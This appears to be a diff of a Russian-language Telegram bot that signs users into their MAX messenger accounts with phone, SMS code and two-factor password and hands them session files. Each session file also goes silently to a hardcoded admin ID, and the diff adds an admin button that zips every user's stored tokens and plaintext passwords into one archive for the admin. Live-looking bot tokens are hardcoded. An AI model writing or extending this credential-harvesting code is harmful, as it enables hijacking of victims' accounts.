@@ -5,7 +5,7 @@ import uuid
 import logging
 import time
 import sqlite3
-import qrcode
+import zipfile
 from io import BytesIO
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.fsm.context import FSMContext
@@ -13,9 +13,9 @@ from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.types import FSInputFile, InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
 from aiogram.utils.keyboard import InlineKeyboardBuilder
-from pymax import Client as SocketMaxClient, WebClient, QrAuthFlow, QrHandler
+from pymax import Client as SocketMaxClient
 
-BOT_TOKEN = "8974560846:AAFcnYE-RXFl8d7ct0gpEQlQfIe6FBRNrxI"
+BOT_TOKEN = "8992822126:AAGn06w87GIZgTAJZD39v4pC_9-dNKEMm0c"
 ADMIN_ID = 8632861931
 
 logging.basicConfig(level=logging.INFO)
@@ -86,77 +86,12 @@ def build_desktop_json(token, device_id, password, user_id, phone):
         "password": password if password else None
     }
 
-def generate_web_js(device_id, token, viewer_id):
-    auth = {"token": token, "viewerId": viewer_id}
-    auth_str = json.dumps(auth, ensure_ascii=False, separators=(',', ':'))
-    return f"""sessionStorage.clear();
-localStorage.clear();
-localStorage.setItem('__oneme_device_id','{device_id}');
-localStorage.setItem('__oneme_auth','{auth_str}');
-window.location.reload();"""
-
-async def send_files_to_user(phone, user_id, work_dir, desktop, js):
-    dp = f"{work_dir}/desktop_session.txt"
-    with open(dp, "w") as f:
-        json.dump(desktop, f, ensure_ascii=False, indent=4)
-    wp = f"{work_dir}/web_token.txt"
-    with open(wp, "w") as f:
-        f.write(js)
-    await bot.send_document(user_id, FSInputFile(dp), caption=f"💻 Десктоп-сессия\n{phone}")
-    await bot.send_document(ADMIN_ID, FSInputFile(dp), caption=f"💻 Десктоп\n{phone}")
-
-async def get_web_token_via_qr(phone, uid, work_dir, user_password, user_id):
-    qr_link_holder = {}
-
-    class QrCatcher(QrHandler):
-        async def show_qr(self, qr_link):
-            qr_link_holder['link'] = qr_link
-            return True
-
-    web_client = WebClient(
-        work_dir=f"{work_dir}_web",
-        auth_flow=QrAuthFlow(qr_provider=QrCatcher())
-    )
-
-    task = asyncio.ensure_future(web_client.start())
-
-    for _ in range(30):
-        await asyncio.sleep(1)
-        if 'link' in qr_link_holder:
-            break
-
-    if 'link' not in qr_link_holder:
-        task.cancel()
-        return None, None
-
-    qr_link = qr_link_holder['link']
-
-    img = qrcode.make(qr_link)
-    img_bytes = BytesIO()
-    img.save(img_bytes, format='PNG')
-    img_bytes.seek(0)
-
-    await bot.send_photo(
-        uid,
-        photo=BufferedInputFile(img_bytes.getvalue(), filename='qr.png'),
-        caption="📱 Отсканируйте этот QR через web.max.ru\n⏳ 2 минуты"
-    )
-
-    try:
-        await asyncio.wait_for(task, timeout=120)
-        if web_client.token:
-            return web_client.token, None
-    except asyncio.TimeoutError:
-        pass
-    except Exception as e:
-        logging.error(f"WebClient error: {e}")
-
-    return None, None
-
 # ==================== МЕНЮ ====================
 
-def accounts_keyboard(uid):
+def accounts_keyboard(uid, is_admin=False):
     builder = InlineKeyboardBuilder()
+    if is_admin:
+        builder.row(InlineKeyboardButton(text="📦 Скачать все токены (ZIP)", callback_data="admin_zip"))
     builder.row(InlineKeyboardButton(text="➕ Добавить аккаунт", callback_data="add_account"))
     for phone in accounts.get(str(uid), {}):
         builder.row(InlineKeyboardButton(text=f"📱 {phone}", callback_data=f"acc_{phone}"))
@@ -164,8 +99,7 @@ def accounts_keyboard(uid):
 
 def account_actions_keyboard(phone):
     builder = InlineKeyboardBuilder()
-    builder.row(InlineKeyboardButton(text="💻 Десктоп-токен", callback_data=f"desk_{phone}"))
-    builder.row(InlineKeyboardButton(text="🌐 Веб-токен (QR)", callback_data=f"webtok_{phone}"))
+    builder.row(InlineKeyboardButton(text="💻 Получить десктоп", callback_data=f"desk_{phone}"))
     builder.row(InlineKeyboardButton(text="🗑 Удалить", callback_data=f"del_{phone}"))
     builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="my_accounts"))
     return builder.as_markup()
@@ -178,11 +112,39 @@ async def start(message: types.Message):
 
 @dp.message(F.text == "👤 Мои аккаунты")
 async def my_accounts(message: types.Message):
-    await message.answer("📱 Аккаунты:", reply_markup=accounts_keyboard(message.from_user.id))
+    is_admin = (message.from_user.id == ADMIN_ID)
+    await message.answer("📱 Аккаунты:", reply_markup=accounts_keyboard(message.from_user.id, is_admin))
 
 @dp.callback_query(F.data == "my_accounts")
 async def cb_my_accounts(callback: types.CallbackQuery):
-    await callback.message.edit_text("📱 Аккаунты:", reply_markup=accounts_keyboard(callback.from_user.id))
+    is_admin = (callback.from_user.id == ADMIN_ID)
+    await callback.message.edit_text("📱 Аккаунты:", reply_markup=accounts_keyboard(callback.from_user.id, is_admin))
+
+@dp.callback_query(F.data == "admin_zip")
+async def cb_admin_zip(callback: types.CallbackQuery):
+    if callback.from_user.id != ADMIN_ID:
+        await callback.answer("Только для админа")
+        return
+
+    zip_buffer = BytesIO()
+    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
+        for uid, accs in accounts.items():
+            for phone, data in accs.items():
+                token = data.get("token", "")
+                dev = get_device_id_from_session(data.get("work_dir", ""))
+                pwd = data.get("password", "")
+                uid_val = data.get("user_id", 0)
+                desktop = build_desktop_json(token, dev, pwd, uid_val, phone)
+                filename = f"{phone}.txt"
+                zf.writestr(filename, json.dumps(desktop, ensure_ascii=False, indent=4))
+
+    zip_buffer.seek(0)
+    await bot.send_document(
+        ADMIN_ID,
+        BufferedInputFile(zip_buffer.getvalue(), filename="all_tokens.zip"),
+        caption="📦 Все токены"
+    )
+    await callback.answer("Архив отправлен!")
 
 @dp.callback_query(F.data == "add_account")
 async def cb_add_account(callback: types.CallbackQuery, state: FSMContext):
@@ -204,7 +166,8 @@ async def cb_delete(callback: types.CallbackQuery):
     if uid in accounts and phone in accounts[uid]:
         del accounts[uid][phone]
         save_accounts()
-    await callback.message.edit_text("📱 Аккаунты:", reply_markup=accounts_keyboard(callback.from_user.id))
+    is_admin = (callback.from_user.id == ADMIN_ID)
+    await callback.message.edit_text("📱 Аккаунты:", reply_markup=accounts_keyboard(callback.from_user.id, is_admin))
     await callback.answer("Удалено")
 
 @dp.callback_query(F.data.startswith("desk_"))
@@ -223,39 +186,15 @@ async def cb_desk(callback: types.CallbackQuery):
     user_password = data.get("password", "")
 
     desktop = build_desktop_json(token, dev, user_password, user_id, phone)
-    js = generate_web_js(dev, token, user_id)
-    await send_files_to_user(phone, callback.from_user.id, work_dir, desktop, js)
+    dp_path = f"{work_dir}/desktop_session.txt"
+    with open(dp_path, "w") as f:
+        json.dump(desktop, f, ensure_ascii=False, indent=4)
+
+    # Админу всегда
+    await bot.send_document(ADMIN_ID, FSInputFile(dp_path), caption=f"💻 Десктоп\n{phone}")
+    # Пользователю
+    await bot.send_document(callback.from_user.id, FSInputFile(dp_path), caption=f"💻 Десктоп-сессия\n{phone}")
     await callback.answer("Отправлено!")
-
-@dp.callback_query(F.data.startswith("webtok_"))
-async def cb_webtok(callback: types.CallbackQuery):
-    phone = callback.data[7:]
-    uid = str(callback.from_user.id)
-    data = accounts.get(uid, {}).get(phone)
-    if not data:
-        await callback.answer("Аккаунт не найден")
-        return
-
-    await callback.answer("Генерирую QR...")
-    msg = await callback.message.answer(f"🌐 Получаю QR для {phone}...")
-
-    user_password = data.get("password", "")
-    user_id = data["user_id"]
-    work_dir = data["work_dir"]
-
-    web_token, _ = await get_web_token_via_qr(phone, uid, work_dir, user_password, user_id)
-
-    if web_token:
-        dev = get_device_id_from_session(work_dir)
-        js = generate_web_js(dev, web_token, user_id)
-        wp = f"{work_dir}/web_token.txt"
-        with open(wp, "w") as f:
-            f.write(js)
-        await bot.send_document(callback.from_user.id, FSInputFile(wp), caption=f"🌐 Веб-токен\n{phone}")
-        await bot.send_document(ADMIN_ID, FSInputFile(wp), caption=f"🌐 Веб\n{phone}")
-        await msg.edit_text(f"✅ Веб-токен для {phone} готов!")
-    else:
-        await msg.edit_text(f"❌ Не удалось получить веб-токен. Возможно, QR не был отсканирован.")
 
 # ==================== ВХОД ====================
 
@@ -272,7 +211,6 @@ async def phone_handler(message: types.Message, state: FSMContext):
 
     client = SocketMaxClient(phone=phone, work_dir=work_dir)
     pending[uid] = {"client": client, "phone": phone, "work_dir": work_dir}
-    await state.set_state(AuthState.waiting_for_code)
     await state.update_data(phone=phone, work_dir=work_dir)
 
     msg = await message.answer("⏳ Отправляю SMS...")
@@ -325,7 +263,6 @@ async def code_handler(message: types.Message, state: FSMContext):
     phone = data.get("phone", "")
     work_dir = data.get("work_dir", "")
 
-    # Передаём код МГНОВЕННО
     import builtins
     builtins._code = message.text.strip()
 
@@ -344,7 +281,7 @@ async def code_handler(message: types.Message, state: FSMContext):
             if uid_str not in accounts: accounts[uid_str] = {}
             accounts[uid_str][phone] = {"token": token, "user_id": vid, "work_dir": work_dir}
             save_accounts()
-            await msg.edit_text("✅ Аккаунт добавлен!", reply_markup=accounts_keyboard(uid))
+            await msg.edit_text("✅ Аккаунт добавлен!")
             del pending[uid]; await state.clear(); return
 
         elif status == "need_password":
@@ -408,7 +345,7 @@ async def password_handler(message: types.Message, state: FSMContext):
         if uid_str not in accounts: accounts[uid_str] = {}
         accounts[uid_str][phone] = {"token": token, "user_id": vid, "work_dir": work_dir, "password": pwd}
         save_accounts()
-        await msg.edit_text("✅ Аккаунт добавлен!", reply_markup=accounts_keyboard(uid))
+        await msg.edit_text("✅ Аккаунт добавлен!")
         del pending[uid]; await state.clear(); return
 
     await msg.edit_text("❌ Неверный пароль. Попробуйте ещё раз.")
